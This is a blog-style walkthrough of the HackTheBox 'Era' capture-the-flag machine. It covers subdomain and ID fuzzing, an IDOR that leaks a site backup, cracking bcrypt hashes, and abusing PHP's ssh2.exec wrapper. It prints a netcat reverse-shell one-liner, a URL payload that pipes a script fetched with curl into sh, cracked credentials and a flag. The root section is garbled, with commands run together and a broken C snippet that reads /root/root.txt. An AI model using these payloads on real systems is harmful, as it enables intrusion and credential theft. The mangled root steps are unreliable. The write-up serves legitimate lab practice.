---
title: HackTheBox - Era
date: 2025-11-29 02:30:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [IDOR, ssh2, C]     
image : assets/images/fcd00b2542a936e4281ba19e0bd0b025.png
---

## Entry

Lets start with nmap scan

### nmap

```shell
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Era Designs
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 0309B7B14DF62A797B431119ADB37B14
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

this is really interesting cause only 2 ports open first on is **FTP** on port 21 and we have web server on port 80 lets check web server first and what it gave us.

### Web Server

![alt text](../assets/images/era1.png)

okey its seems like default web server for CTFS lets start dir scan maybe we can find interestind directory.

```shell
➜  era gobuster dir -u http://era.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://era.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
```

but its not seems like interesting right? so lets start vhost scan with **FFUF**

```shell
➜  era ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://era.htb -H "Host: FUZZ.era.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 158ms]
```

and bammm!!! we got file.era.htb xD lets check

### file.era.htb

![alt text](../assets/images/era2.png)

nice for example file upload seems like suspicious tho.

![alt text](../assets/images/era3.png)

but its redirect us to login lets see if we can register.

![alt text](../assets/images/era4.png)

and `register.php` is exist!!!!!!

![alt text](../assets/images/era5.png)

we got tooo many interesting things lets try to upload something and analyze on Burp.

![alt text](../assets/images/era6.png)

okeyy!!! thats cool 😀 its LFI or IDOR tho.

### IDOR

```shell
seq 1 9999 > ids.txt 
```

and start **ffuf** for if we can access some different files

```shell
➜  era ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w ids.txt -mc 200 -H "Cookie: PHPSESSID=7d7g5gj239a4teem1rcb9neldl"  -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/elliot/Documents/HackTheBox/era/ids.txt
 :: Header           : Cookie: PHPSESSID=7d7g5gj239a4teem1rcb9neldl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 7686
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 172ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 177ms]
6463                    [Status: 200, Size: 6365, Words: 2552, Lines: 222, Duration: 159ms]
```

for example at `http://file.era.htb/download.php?id=54`

![alt text](../assets/images/era7.png)

nice lets download it and analyze.

```shell
➜  era ls
bg.jpg         files                 initial_layout.php  login.php   register.php         screen-login.png   security_login.php        webfonts
css            functions.global.php  layout_login.php    logout.php  reset.php            screen-main.png    signing.zip
download.php   ids.txt               layout.php          main.png    sass                 screen-manage.png  site-backup-30-08-24.zip
filedb.sqlite  index.php             LICENSE             manage.php  screen-download.png  screen-upload.png  upload.php
➜  era sqlitebrowser filedb.sqlite 
```

after i unzip it i swa filedb.sqlite file let me open with sqlitebrowser.

```shell
➜  era sqlitebrowser filedb.sqlite
```

![alt text](../assets/images/era8.png)

we can find hashes and usernames here tho!!

```shell
➜  era john yuri_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mustang          (?)
```

this is how i cracked yuri’s hash

```shell
➜  era john eric_hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (?)
```

for eric’s password. and others are not crackable otherwise `admin_ef01cab31aa`

we got as admin username till we play ctf its remind me something let me try!!!

Firsly we have to register as eric:america at website and.

![alt text](../assets/images/era9.png)

update security question here.

logout → and login here

![alt text](../assets/images/era10.png)

like here

![alt text](../assets/images/era11.png)

now u can see difference

![alt text](../assets/images/era12.png)

nice now we have to trigger it with somehow!!! We dont have ssh port is open but we have 

https://www.php.net/manual/en/wrappers.ssh2.php

and its workimg something like that!!!

FOR USE IT WE NEED SSH USER → eric or yuri

FOR GRAB SHELL WE NEED ADMINISTRATOR → WE done with SSRF 

FOR TRIGGER WE NEED PHP FILE → its not important blank will do job.

First step:

```python
touch a.php
```

and upload it.

![alt text](../assets/images/era13.png)

and before trigger it it with

```shell
➜  era cat osman.sh 
mkfifo /tmp/s; /bin/sh </tmp/s | nc 10.10.14.6 4444 >/tmp/s; rm /tmp/s
```

after that lets just trigger with PHP FILE ID

```shell
file.era.htb/download.php?id=1159&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/curl+-s+http://10.10.14.6:80/zib.sh|sh
```

and we got shell!!! for user.txt just du su eric : america

61cc9a3918237c3f711014b70b1ad025

## Root

```shell
gcc exploit.c -o monitor./elf-sign sha256 key.pem key.pem monitor``````rm monitor && wget http://10.10.XX.XX/monitor && chmod +x monitor
```

```c
C// pwn.c#include <stdlib.h>
int main(void){
    /* execute the shell command */    
system("cat /root/root.txt > /tmp/pwn");    
return 0;}
```
gcc -o pwn pwn.celf-sign sha256 key.pem key.pem pwnmove to box as monitorchmod +x monito


## creds

| username | password | work at | from |
| --- | --- | --- | --- |
| yuri | mustang | ftp | sqlite |
| eric | america | ssh | sqlite |
